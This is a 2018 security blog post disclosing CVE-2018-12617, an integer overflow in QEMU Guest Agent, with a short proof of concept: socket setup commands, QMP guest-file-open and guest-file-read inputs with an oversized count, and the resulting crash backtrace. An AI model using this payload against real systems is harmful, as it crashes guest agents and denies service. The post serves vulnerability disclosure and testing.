<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <meta name="apple-mobile-web-app-capable" content="yes"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title> QEMU Guest Agent Denial of Service | Fakhri Zulkifli </title> <meta name="description" content=" QEMU Guest Agent Denial of Service "> <meta name="keywords" content="qemu, qemu-ga, dos, denial of service"> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <!-- Social: Facebook / Open Graph --> <meta property="og:type" content="article"> <meta property="article:author" content="Fakhri Zulkifli"> <meta property="article:section" content=""> <meta property="article:tag" content="qemu, qemu-ga, dos, denial of service"> <meta property="article:published_time" content="2018-06-07 00:00:00 +0800"> <meta property="og:url" content="http://localhost:4000/2018/CVE-2018-12617/"> <meta property="og:title" content=" QEMU Guest Agent Denial of Service | Fakhri Zulkifli "> <meta property="og:image" content="http://localhost:4000"> <meta property="og:description" content=" QEMU Guest Agent Denial of Service "> <meta property="og:site_name" content="Fakhri Zulkifli"> <meta property="og:locale" content="en_US"> <!-- Social: Twitter --> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:site" content="d0lph1n98"> <meta name="twitter:title" content=" QEMU Guest Agent Denial of Service | Fakhri Zulkifli "> <meta name="twitter:description" content=" QEMU Guest Agent Denial of Service "> <meta name="twitter:image:src" content="http://localhost:4000"> <!-- Social: Google+ / Schema.org --> <meta itemprop="name" content=" QEMU Guest Agent Denial of Service | Fakhri Zulkifli "> <meta itemprop="description" content=" QEMU Guest Agent Denial of Service "> <meta itemprop="image" content="http://localhost:4000"> <!-- Canonical link tag --> <link rel="canonical" href="http://localhost:4000/2018/CVE-2018-12617/"> <link rel="alternate" type="application/rss+xml" title="Fakhri Zulkifli" href="http://localhost:4000/feed.xml"> <!-- rel prev and next --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> </head> <body> <main class="wrapper"> <header class="site-header"> <nav class="nav"> <div class="container"> <h1 class="logo"><a href="http://localhost:4000/">Fakhri Zulkifli<span></span></a></h1> <ul class="navbar"> <li><a href="http://localhost:4000/about">About me</a></li> <li><a href="http://localhost:4000/feed.xml" target="_blank">RSS</a></li> </ul> </div> </nav> </header> <article class="post container" itemscope itemtype="http://schema.org/BlogPosting"> <header class="post-header"> <p class="post-meta"><time datetime="2018-06-07T00:00:00+08:00" itemprop="datePublished">Jun 7, 2018</time></p> <h1 class="post-title" itemprop="name headline">QEMU Guest Agent Denial of Service</h1> </header> <div class="post-content" itemprop="articleBody"> <p>Exploit Title: QEMU Guest Agent Denial of Service<br /> Date: 2018-06-07<br /> Exploit Author: Fakhri Zulkifli (@d0lph1n98)<br /> Vendor Homepage: https://www.qemu.org/<br /> Software Link: https://www.qemu.org/download/<br /> Version: 2.12.50 and earlier<br /> Tested on: 2.12.50<br /> CVE : CVE-2018-12617<br /></p> <p>QEMU Guest Agent 2.12.50 and earlier has an integer overflow causing a g_malloc0() call to trigger a segfault() call when trying to allocate a large memory chunk. The vulnerability can be exploited by sending a specific QMP command to the agent via the listening socket.</p> <p>1st, execute the guest-agent using the following command:</p> <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ qemu-ga -m unix-listen -p /tmp/qga.sock -t /tmp
</code></pre></div></div> <p>2nd, on the other console, connect to the UNIX socket using socat:</p> <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ socat unix-connect:/tmp/qga.sock -
</code></pre></div></div> <p>3rd, enter the following QMP command:</p> <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"execute":"guest-file-open", "arguments":{"path":"/tmp/poc","mode":"w+‚Äù}}
{"return": 1000}
{"execute":"guest-file-read", "arguments":{"handle":1000,"count":4294967295}}
</code></pre></div></div> <p>The guest-file-read must be specified with the correct handle value (file descriptor). Different files will have different handle value.</p> <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#0 0x5598eed0a1af in calloc /home/user/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:107
#1 0x7f2ce5d7d770 in g_malloc0 (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4f770)
#2 0x5598eed84996 in qmp_marshal_guest_file_read /home/user/qemu/qga/qapi-generated/qga-qapi-commands.c:425:14
#3 0x5598eeda4fcf in do_qmp_dispatch /home/user/qemu/qapi/qmp-dispatch.c:119:5
#4 0x5598eeda4fcf in qmp_dispatch /home/user/qemu/qapi/qmp-dispatch.c:168
#5 0x5598eed59bff in process_command /home/user/qemu/qga/main.c:589:11
#6 0x5598eed59bff in process_event /home/user/qemu/qga/main.c:626
#7 0x5598eedb5f13 in json_message_process_token /home/user/qemu/qobject/json-streamer.c:105:5
#8 0x5598eee25d9b in json_lexer_feed_char /home/user/qemu/qobject/json-lexer.c:323:13
#9 0x5598eee25333 in json_lexer_feed /home/user/qemu/qobject/json-lexer.c:373:15
#10 0x5598eed5a95e in channel_event_cb /home/user/qemu/qga/main.c:659:9
#11 0x5598eed710c1 in ga_channel_client_event /home/user/qemu/qga/channel-posix.c:92:23
#12 0x7f2ce5d78049 in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a049)
</code></pre></div></div> <hr /> <p>References:</p> <ol> <li>https://lists.gnu.org/archive/html/qemu-devel/2018-06/msg03385.html</li> </ol> </div> </article> <footer class="site-footer"> <div class="container"> <small class="block">&copy; 2018 Fakhri Zulkifli </div> </footer> </main> <script type="text/javascript"> var _gaq = _gaq || []; _gaq.push(['_setAccount', 'UA-XXXXX-XX']); _gaq.push(['_trackPageview']); (function() { var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s); })(); </script> </body> </html>
